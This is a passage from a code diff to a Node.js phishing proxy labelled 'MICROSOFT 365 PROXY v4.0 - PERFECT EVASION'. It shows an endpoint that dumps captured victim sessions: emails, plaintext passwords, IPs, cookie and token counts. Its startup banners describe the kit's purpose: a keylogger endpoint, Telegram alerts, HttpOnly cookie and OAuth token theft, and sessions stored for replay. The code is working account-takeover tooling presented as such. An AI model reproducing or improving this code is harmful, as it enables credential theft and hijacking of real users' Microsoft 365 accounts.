+        const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
+            sessionId: id.substring(0, 12) + '...',
+            email: VICTIM_SESSIONS[id].email || 'N/A',
+            password: VICTIM_SESSIONS[id].password || 'N/A',
+            ip: VICTIM_SESSIONS[id].ip || 'N/A',
+            created: VICTIM_SESSIONS[id].created,
+            attempts: VICTIM_SESSIONS[id].attempts || 0,
+            httpOnlyCount: sessionStore.httpOnlyCookies.get(id)?.length || 0,
+            tokenCount: sessionStore.allTokens.get(id) ? 
+                Object.values(sessionStore.allTokens.get(id)).filter(t => t && t.value && t.isValid !== false).length : 0,
+            passwordCaptures: sessionStore.passwordCaptures.get(id)?.length || 0,
+            hasFullAuth: !!sessionStore.getFullAuthData(id),
+            lastValidation: VICTIM_SESSIONS[id].lastValidationResult || 'unknown'
+        }));
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+            total: sessionData.length,
+            sessions: sessionData,
+            stats: sessionStore.getStats(),
+            evasionActive: true
+        }, null, 2));
+        return;
+    }
+
+    // ============================================================
+    //  POST REQUESTS
+    // ============================================================
+    
     if (req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -2802,71 +2223,55 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Login requests
+    // ============================================================
+    //  LOGIN REQUESTS
+    // ============================================================
+    
     if (req.url.startsWith(PROXY_ENTRY_POINT)) {
         handleLoginRequest(req, res);
         return;
     }
 
-    // Default redirect
+    // ============================================================
+    //  DEFAULT REDIRECT
+    // ============================================================
+    
     res.writeHead(302, { 'Location': REDIRECT_URL });
     res.end();
 });
-
-function serveFile(filename, res, contentType = 'text/html') {
-    const filePath = path.join(__dirname, filename);
-    fs.readFile(filePath, (err, data) => {
-        if (err) {
-            res.writeHead(404);
-            res.end('<h1>404 Not Found</h1>');
-            return;
-        }
-        res.writeHead(200, { 
-            'Content-Type': contentType, 
-            'Cache-Control': 'no-store, no-cache'
-        });
-        res.end(data);
-    });
-}
 
 // ============================================================
 //  START SERVER
 // ============================================================
 
-const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log('╔═══════════════════════════════════════════════════════════╗');
-    console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - COMPLETE           ║');
-    console.log('║     🔐  HttpOnly Cookie Capture + Password Capture      ║');
-    console.log('║     📊  Full Telegram Alerts for ALL Events             ║');
-    console.log('║                                                           ║');
-    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
-    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                     ║`);
-    console.log(`║   🍪 HttpOnly:  ${PROXY_PATHNAMES.cookieStoreEndpoint}  ║`);
-    console.log(`║   🔑 Password:  ${PROXY_PATHNAMES.passwordCapture}      ║`);
-    console.log(`║   ⌨️ Keylogger: ${PROXY_PATHNAMES.keylogEndpoint}       ║`);
-    console.log('║                                                           ║');
-    console.log('╠═══════════════════════════════════════════════════════════╣');
-    console.log('║   📱 TELEGRAM ALERTS:                                   ║');
-    console.log('║   ✅ Password Captured (with source)                    ║');
-    console.log('║   ✅ VALID Credentials (with tokens & cookies)          ║');
-    console.log('║   ❌ INVALID Credentials (with error)                   ║');
-    console.log('║   🍪 HttpOnly Cookies Captured                         ║');
-    console.log('║   ⌨️ Keylogger Password Extracted                      ║');
-    console.log('║   🎯 Full Auth Data Captured                           ║');
-    console.log('║   🤖 OAuth Auto-Capture                                ║');
-    console.log('║                                                           ║');
-    console.log('╠═══════════════════════════════════════════════════════════╣');
-    console.log('║   📊 FLOW:                                               ║');
-    console.log('║   1. User enters credentials                            ║');
-    console.log('║   2. Password Capture Script captures                   ║');
-    console.log('║   3. Sends to Telegram (PASSWORD CAPTURED)             ║');
-    console.log('║   4. Proxy verifies with Microsoft                     ║');
-    console.log('║   5. If VALID → Send SUCCESS alert + Tokens + Cookies  ║');
-    console.log('║   6. If INVALID → Send FAILED alert + Error            ║');
-    console.log('║   7. HttpOnly cookies captured from response           ║');
-    console.log('║   8. Full session data stored for replay              ║');
-    console.log('╚═══════════════════════════════════════════════════════════╝');
+    console.log('╔═══════════════════════════════════════════════════════════════╗');
+    console.log('║                                                               ║');
+    console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
+    console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
+    console.log('║     ✅  FIXED: Serve files from public/ folder               ║');
+    console.log('║     ✅  FIXED: Microsoft OAuth Tenant-Specific Endpoint      ║');
+    console.log('║                                                               ║');
+    console.log('╠═══════════════════════════════════════════════════════════════╣');
+    console.log('║                                                               ║');
+    console.log(`║   📍 Server:    http://localhost:${PORT}                       ║`);
+    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                         ║`);
+    console.log('║                                                               ║');
+    console.log('╠═══════════════════════════════════════════════════════════════╣');
+    console.log('║                                                               ║');
+    console.log('║   ✅ FIXED: 404 Not Found - files now served from public/    ║');
+    console.log('║   ✅ FIXED: AADSTS9001023 - using tenant-specific endpoint   ║');
+    console.log('║                                                               ║');
+    console.log('╠═══════════════════════════════════════════════════════════════╣');
+    console.log('║                                                               ║');
+    console.log('║   🔑 COMPLETE SESSION DATA:                                  ║');
+    console.log('║   • Email + Password (CORRECT & WRONG)                      ║');
+    console.log('║   • HttpOnly Cookies (Set-Cookie headers)                    ║');
+    console.log('║   • OAuth Tokens (Access, Refresh, ID)                       ║');
+    console.log('║   • Full Authentication Data                                 ║');
+    console.log('║   • Session Replay Ready                                     ║');
+    console.log('║                                                               ║');
+    console.log('╚═══════════════════════════════════════════════════════════════╝');
 });
 
 // ============================================================
@@ -2880,4 +2285,12 @@ setInterval(() => {
 process.on('SIGTERM', () => {
     console.log('🛑 Shutting down gracefully...');
     server.close(() => process.exit(0));
+});
+
+process.on('uncaughtException', (err) => {
+    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
+});
+
+process.on('unhandledRejection', (reason) => {
+    console.error('🔥 UNHANDLED REJECTION:', reason);
 });
